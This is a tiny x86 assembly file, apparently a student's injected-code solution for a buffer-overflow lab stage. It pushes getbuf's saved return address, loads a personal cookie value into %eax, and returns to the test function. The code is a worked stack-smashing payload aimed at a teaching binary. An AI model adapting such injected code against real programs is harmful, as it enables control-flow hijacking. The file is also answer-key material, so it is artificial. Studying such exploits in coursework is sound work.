#in getbuf: x/wx $ebp+4 ==> 0x08048dbe
#push get_buf's return address
pushl $0x08048dbe

#return cheukyin's cookie to test
movl $0x3955ae84, %eax

#return to <test>
ret